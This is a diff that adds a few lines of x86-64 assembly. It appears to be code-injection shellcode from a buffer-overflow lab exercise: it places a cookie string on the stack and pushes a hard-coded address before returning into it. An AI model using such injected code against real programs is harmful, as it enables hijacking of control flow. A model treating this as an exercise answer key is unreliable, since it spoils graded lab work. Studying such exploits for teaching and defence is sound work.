@@ -1,0 +1,6 @@
+leaq    -0x400(%rsp),%rdi
+movq    $0x39623935,(%rdi)
+movq    $0x61663739,0x4(%rdi)
+movq    $0x00000000,0x8(%rdi)
+push    $0x4018fa
+retq
